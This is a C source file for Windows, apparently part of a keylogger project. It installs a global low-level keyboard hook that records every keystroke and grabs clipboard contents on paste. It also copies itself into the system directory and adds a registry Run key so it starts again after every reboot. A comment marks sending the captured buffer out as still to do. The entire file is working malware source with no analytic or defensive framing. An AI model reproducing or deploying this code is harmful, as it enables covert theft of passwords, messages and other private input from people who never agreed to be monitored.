#include <tchar.h> // _tcscat_s, _tprintf, _stprintf_s _tcslen, _taccess
#include <stdio.h>
#include <io.h>

#include "Keylogger.h"

static HHOOK ghHook = { 0 };

CONST PTCHAR GetVirtualKeyName(CONST DWORD vkCode)
{
	switch (vkCode)
	{
	case VK_BACK:
		return TEXT("[BACKSPACE]");

	case VK_TAB:
		return TEXT("[TAB]");

	case VK_RETURN:
		return TEXT("[ENTER]");

	case VK_LSHIFT:
	case VK_RSHIFT:
		return TEXT("[SHIFT]");

	case VK_MENU:
		return TEXT("[ALT]");

	case VK_CAPITAL:
		return TEXT("[CAPSLOCK]");

	case VK_ESCAPE:
		return TEXT("[ESCAPE]");

	case VK_PRIOR:
		return TEXT("[PAGEUP]"); 

	case VK_NEXT:
		return TEXT("[PAGEDOWN]");
	
	case VK_END:
		return TEXT("[END]"); 
	
	case VK_HOME:
		return TEXT("[HOME]");

	case VK_LEFT:
		return TEXT("[LEFT]");

	case VK_UP:
		return TEXT("[UP]");

	case VK_RIGHT:
		return TEXT("[RIGHT]");

	case VK_DOWN:
		return TEXT("[DOWN]");

	case VK_SNAPSHOT:
		return TEXT("[PRINTSCR]");

	case VK_INSERT:
		return TEXT("[INSERT]");

	case VK_DELETE:
		return TEXT("[DELETE]");

	

	// TODO: NUMPAD and FXX keys

	case VK_NUMLOCK:
		return TEXT("[NUMLOCK]");

	case VK_SCROLL:
		return TEXT("[SCROLLLOCK]");

	default:
		return NULL;
	}
}

CONST PTCHAR GetClipboardBuffer()
{
	if (!OpenClipboard(NULL))
	{
		PrintError(TEXT("OpenClipboard"), GetLastError());

		return NULL;
	}

	HANDLE hHandle = GetClipboardData(CF_TEXT);
	if (!hHandle)
	{
		PrintError(TEXT("GetClipboardData"), GetLastError());

		return NULL;
	}

	CONST PTCHAR data = GlobalLock(hHandle);
	if (!data)
	{
		PrintError(TEXT("GlobalLock"), GetLastError());

		return NULL;
	}

	if (!GlobalUnlock(hHandle))
	{
		PrintError(TEXT("GlobalUnlock"), GetLastError());
		if (!CloseClipboard())
			PrintError(TEXT("CloseClipboard"), GetLastError());

		return data;
	}

	if (!CloseClipboard())
	{
		PrintError(TEXT("CloseClipboard"), GetLastError());

		return data;
	}

	return data;
}

BOOL LogKey(CONST PKBDLLHOOKSTRUCT kbdhs) //-V2009
{
	if (kbdhs->vkCode == VK_CONTROL || kbdhs->vkCode  == VK_LCONTROL || kbdhs->vkCode  == VK_RCONTROL)
		return TRUE;

	static TCHAR buffer[KEYLOGGER_BUFFER_LENGTH] = { 0 };

	CONST PTCHAR vkName = GetVirtualKeyName(kbdhs->vkCode);
	if (vkName != NULL)
	{
		errno_t code = _tcscat_s(buffer, KEYLOGGER_BUFFER_LENGTH, vkName);
		if (code != 0)
		{
			_tprintf(TEXT("Cannot construct buffer, error: %d"), code);

			return FALSE;
		}
	}
	else if (GetKeyState(VK_CONTROL) >> 15)
	{
		TCHAR ctrl[] = TEXT("[CTRL + %c]");
		if (_stprintf_s(ctrl, ARRAYSIZE(ctrl), ctrl, (TCHAR)kbdhs->vkCode) == -1) //-V549
		{
			_tprintf(TEXT("_stprintf_s failed\n"));

			return FALSE;
		}
		
		errno_t code = _tcscat_s(buffer, KEYLOGGER_BUFFER_LENGTH, ctrl);
		if (code != 0)
		{
			_tprintf(TEXT("Cannot construct buffer, error: %d\n"), code);

			return FALSE;
		}

		if (kbdhs->vkCode == 0x56)
		{
			CONST PTCHAR clipboard = GetClipboardBuffer();
			if (!clipboard)
				return FALSE;

			_tprintf(TEXT("ClipboardBuffer:%s\n"), clipboard);

			code = _tcscat_s(buffer, KEYLOGGER_BUFFER_LENGTH, clipboard);
			if (code != 0)
			{
				_tprintf(TEXT("Cannot add clipboard data to buffer, error: %d\n"), code);

				return FALSE;
			}
		}
	}
	else 
	{
		BYTE state[KEYBOARD_STATE_SIZE] = { 0 };
		GetKeyboardState(state);

		WORD key = 0;
		if (!ToAscii(kbdhs->vkCode, kbdhs->scanCode, state, &key, 0u))
		{
			_tprintf(TEXT("ToAscii failed to translate\n"));

			return FALSE;
		}

		buffer[_tcslen(buffer)] = (TCHAR)key;
	}
	_tprintf(TEXT("Buffer:%s\n"), buffer);

	if (_tcslen(buffer) >= KEYLOGGER_BUFFER_LENGTH - 10)
	{
		// TODO: SendBuffer

		memset(buffer, 0, sizeof(buffer));
	}

	return TRUE;
}

LRESULT WINAPI KeyboardHook(INT code, WPARAM wParam, LPARAM lParam)
{
	if (code == HC_ACTION && wParam == WM_KEYDOWN)
		LogKey((PKBDLLHOOKSTRUCT)lParam);

	return CallNextHookEx(ghHook, code, wParam, lParam);
}

BOOL SetKeyboardHook()
{
	ghHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0ul);
	if (!ghHook)
	{
		PrintError(TEXT("SetWindowsHookEx"), GetLastError());

		return FALSE;
	}

	return TRUE;
}

BOOL FileExist(CONST PTCHAR filename) //-V2009
{
	INT code = _taccess(filename, 0); // Checks for existence only - (mode = 0)
	if (code == 0)
		return TRUE;
	else
		switch (errno)
		{
		case EACCES:
			_tprintf(TEXT("Access denied: the file's permission setting does not allow specified access.\n"));
			break;

		case ENOENT:
			_tprintf(TEXT("Filename or path not found.\n"));
			break;

		case EINVAL:
			_tprintf(TEXT("Invalid parameter.\n"));
			break;

		default:
			_tprintf(TEXT("Unknown error.\n"));
			break;
		}


	return FALSE;
}

BOOL Copy2Sysdir(CONST PTCHAR appname) //-V2009
{
	HMODULE hModule = NULL;
	if (!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, NULL, &hModule))
	{
		PrintError(TEXT("GetModuleHandleEx"), GetLastError());

		return FALSE;
	}

	TCHAR filepath[SMALL_BUFFER_LENGTH] = { 0 };
	if (!GetModuleFileName(hModule, filepath, SMALL_BUFFER_LENGTH))
	{
		PrintError(TEXT("GetModuleFileName"), GetLastError());

		return FALSE;
	}

	TCHAR filename[SMALL_BUFFER_LENGTH] = TEXT("\\");
	errno_t code = _tcscat_s(filename, SMALL_BUFFER_LENGTH, appname);
	if (code != 0)
	{
		_tprintf(TEXT("Cannot construct filename, error: %d"), code);

		return FALSE;
	}

	TCHAR sysdir[SMALL_BUFFER_LENGTH] = { 0 };
	if (!GetSystemDirectory(sysdir, SMALL_BUFFER_LENGTH))
	{
		PrintError(TEXT("GetSystemDirectory"), GetLastError());

		return FALSE;
	}

	code = _tcscat_s(sysdir, SMALL_BUFFER_LENGTH, filename);
	if (code != 0)
	{
		_tprintf(TEXT("Cannot construct sysdir path, error: %d"), code);

		return FALSE;
	}

	if (!FileExist(sysdir))
		if (!CopyFileEx(filepath, sysdir, NULL, NULL, FALSE, COPY_FILE_FAIL_IF_EXISTS))
		{
			PrintError(TEXT("CopyFile"), GetLastError());

			return FALSE;
		}

	return TRUE;
}

BOOL SaveInReg(CONST PTCHAR appname) //-V2009
{
	TCHAR filename[SMALL_BUFFER_LENGTH] = TEXT("\\");
	errno_t code = _tcscat_s(filename, SMALL_BUFFER_LENGTH, appname);
	if (code != 0)
	{
		_tprintf(TEXT("Cannot construct filename, error: %d"), code);

		return FALSE;
	}

	TCHAR sysdir[SMALL_BUFFER_LENGTH] = { 0 };
	if (!GetSystemDirectory(sysdir, SMALL_BUFFER_LENGTH))
	{
		PrintError(TEXT("GetSystemDirectory"), GetLastError());

		return FALSE;
	}

	code = _tcscat_s(sysdir, SMALL_BUFFER_LENGTH, filename);
	if (code != 0)
	{
		_tprintf(TEXT("Cannot construct sysdir path, error: %d"), code);

		return FALSE;
	}

	HKEY hKey = NULL;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0ul, KEY_WRITE, &hKey) != ERROR_SUCCESS)
	{
		PrintError(TEXT("RegOpenKeyEx"), GetLastError());

		return FALSE;
	}

	if (RegSetValueEx(hKey, appname, 0ul, REG_EXPAND_SZ, (BYTE*)sysdir, SMALL_BUFFER_LENGTH) != ERROR_SUCCESS)
	{
		PrintError(TEXT("RegSetValueEx"), GetLastError());
		if (RegCloseKey(hKey) != ERROR_SUCCESS)
			PrintError(TEXT("RegCloseKey"), GetLastError());

		return FALSE;
	}

	if (RegCloseKey(hKey) != ERROR_SUCCESS)
	{
		PrintError(TEXT("RegCloseKey"), GetLastError());

		return FALSE;
	}

	return TRUE;
}

VOID PrintError(const PTCHAR msg, INT error)
{
	TCHAR sysmsg[SMALL_BUFFER_LENGTH] = { 0 };
	if (!FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), sysmsg, SMALL_BUFFER_LENGTH, NULL))
	{
		_tprintf(TEXT("[ERROR]: FormatMessage failed with 0x%x\n"), GetLastError());

		return;
	}

	PTCHAR p = sysmsg;
	while ((*p > 31) || (*p == 9))
		++p;

	do
	{
		*p-- = 0;
	} while (p >= sysmsg && (*p == '.' || *p < 33));

	_tprintf(TEXT("[ERROR]: \'%s\' failed with error %d (%s)\n"), msg, error, sysmsg);
}
